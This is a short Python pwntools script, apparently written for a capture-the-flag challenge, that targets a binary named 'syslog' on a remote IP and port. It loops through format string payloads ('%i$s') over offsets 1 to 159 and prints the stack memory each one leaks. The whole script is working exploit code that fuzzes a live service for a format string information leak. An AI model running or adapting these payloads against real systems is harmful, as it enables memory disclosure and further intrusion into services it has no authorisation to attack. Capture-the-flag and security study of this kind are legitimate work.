from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./syslog', checksec=False)
context.log_level = 'error'


# p = process('./syslog')


# Let's fuzz 100 values
with open('leaked','w') as file:
    for i in range(1,160):
        try:
            # Create process (level used to reduce noise)
            p = remote('34.159.182.195',31611)

            p.sendlineafter(b':',b'1')
            
            p.sendlineafter(b':', b'1')
            
            # When we see the user prompt '>', format the counter
            # e.g. %2$s will attempt to print second pointer as string
            p.sendlineafter(b':',f'%{i}$s'.encode())
            
            p.sendlineafter(b':',b'2')
            p.recvuntil(b'syslog')
            result = p.recvuntil(b'========= MENU ==========')
            # print(i)
            print(str(i) + ': ' + str(result) + '\n')
            # Exit the process
            p.close()
            
        except :
            pass

p.interactive()
